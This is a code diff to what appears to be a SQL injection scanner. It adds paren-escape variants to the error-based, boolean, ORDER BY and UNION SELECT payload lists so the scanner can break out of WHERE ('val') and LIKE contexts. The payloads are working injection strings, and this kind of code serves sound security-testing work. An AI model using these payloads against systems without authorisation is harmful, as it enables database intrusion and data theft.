@@ -57,6 +57,11 @@ ERROR_PAYLOADS: dict[str, List[str]] = {
         "'-- -",
         '"-- -',
         "'#",
+        # Paren-escape variants: covers WHERE x=('val') and LIKE ('%val%') contexts
+        "')-- -",
+        "'))-- -",
+        "') --",
+        "')) --",
         "' OR '1'='1",
         "' OR 1=1-- -",
         "' AND 1=CONVERT(int,'a')-- -",
@@ -101,6 +106,9 @@ ERROR_PAYLOADS: dict[str, List[str]] = {
         "' UNION SELECT sqlite_version(),NULL-- -",
         "' AND randomblob(1)-- -",
         "1' AND '1'='1",
+        # Paren-escape variants for SQLite LIKE contexts
+        "') AND 1=CAST(sqlite_version() AS INTEGER)-- -",
+        "')) AND 1=CAST(sqlite_version() AS INTEGER)-- -",
     ],
     "oracle": [
         "' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
@@ -187,6 +195,12 @@ BOOLEAN_PAIRS: List[Tuple[str, str]] = [
     # Numeric context (no quotes needed)
     (" AND 1=1",       " AND 1=2"),
     (" AND 1=1-- -",   " AND 1=2-- -"),
+    # Single-paren escape: WHERE x=('val') context
+    ("') AND 1=1-- -",  "') AND 1=2-- -"),
+    ("') AND 1=1 --",   "') AND 1=2 --"),
+    # Double-paren escape: WHERE x LIKE ('%val%') context
+    ("')) AND 1=1-- -", "')) AND 1=2-- -"),
+    ("')) AND 1=1 --",  "')) AND 1=2 --"),
     # OR variants (risk>=2)
     ("' OR '1'='1", "' OR '1'='2"),
     ("' OR 1=1-- -",  "' OR 1=2-- -"),
@@ -268,23 +282,28 @@ def order_by_probes(max_cols: int = 20) -> List[str]:
     """
     Generate ORDER BY N probes to determine column count.
 
-    Four variants are emitted for each column count, covering both SQL
-    injection contexts:
+    Six variants are emitted for each column count, covering SQL injection
+    contexts:
 
     - String context (``'`` prefix): used when the param value is quoted
+    - Single-paren escape (``')`` prefix): covers ``WHERE x = ('val')``
+    - Double-paren escape (``'))`` prefix): covers ``WHERE x LIKE ('%val%')``
     - Numeric context (no prefix): used when the param is bare numeric
     - Two comment terminators each: ``-- -`` (ANSI) and ``#`` (MySQL)
 
-    The probes are interleaved: string then numeric at each N so the
-    scanner tries all styles before advancing to N+1 — allowing early
-    termination on whatever comment style/context matches.
+    The probes are interleaved so the scanner tries all context styles before
+    advancing to N+1 — allowing early termination on whatever context matches.
     """
     probes = []
     for n in range(1, max_cols + 1):
         probes.append(f"' ORDER BY {n}-- -")
         probes.append(f"' ORDER BY {n}#")
-        probes.append(f" ORDER BY {n}-- -")   # numeric context
-        probes.append(f" ORDER BY {n}#")       # numeric context, MySQL hash
+        probes.append(f"') ORDER BY {n}-- -")    # single-paren context
+        probes.append(f"') ORDER BY {n}#")
+        probes.append(f"')) ORDER BY {n}-- -")   # double-paren / LIKE context
+        probes.append(f"')) ORDER BY {n} --")    # space before -- (SQLite style)
+        probes.append(f" ORDER BY {n}-- -")      # numeric context
+        probes.append(f" ORDER BY {n}#")         # numeric context, MySQL hash
     return probes
 
 
@@ -311,8 +330,12 @@ def union_null_probes(col_count: int, marker: str) -> List[str]:
         # CAST marker (works for PostgreSQL, MSSQL where column is typed)
         cols_cast = ["NULL"] * col_count
         cols_cast[pos] = f"CAST('{marker}' AS CHAR)"
+        # Integer-padded variant: non-marker columns use sequential integers
+        # (works for type-strict ORMs like Sequelize/SQLite that reject NULL)
+        cols_int = [str(i + 1) for i in range(col_count)]
+        cols_int[pos] = f"'{marker}'"
 
-        for cols in (cols_str, cols_cast):
+        for cols in (cols_str, cols_cast, cols_int):
             inner = ",".join(cols)
             # String context
             payloads.append(f"' UNION SELECT {inner}-- -")
@@ -320,6 +343,11 @@ def union_null_probes(col_count: int, marker: str) -> List[str]:
             # Numeric context
             payloads.append(f" UNION SELECT {inner}-- -")
             payloads.append(f" UNION SELECT {inner}#")
+            # Paren-escape contexts
+            payloads.append(f"') UNION SELECT {inner}-- -")
+            payloads.append(f"') UNION SELECT {inner}#")
+            payloads.append(f"')) UNION SELECT {inner}-- -")
+            payloads.append(f"')) UNION SELECT {inner}#")
     return payloads
 
 
